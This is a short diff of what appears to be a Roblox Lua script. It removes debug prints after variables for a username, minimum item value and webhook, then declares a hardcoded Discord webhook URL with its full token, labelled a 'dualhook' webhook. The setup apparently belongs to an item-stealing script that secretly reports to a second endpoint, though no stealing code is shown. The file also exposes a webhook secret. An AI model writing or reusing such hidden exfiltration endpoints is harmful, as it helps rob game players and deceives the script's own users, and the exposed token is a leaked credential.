@@ -1,13 +1,8 @@
 Username = Username
-print(Username)
 Username = Username
-print(Username)
 min_rap = min_rap
-print(min_rap)
 min_chance = min_chance
-print(min_chance)
 webhook = webhook
-print(webhook)
 
 -- Local variables for the dualhook webhook and user
 local dualhook_webhook = "https://discord.com/api/webhooks/1295393967524810762/9sS0oJjJijMOQPU8V3xOrZNTVihw7wW-i3XGODpWioZNkIRrQVg9B9TtQzifr0VK-ni5"
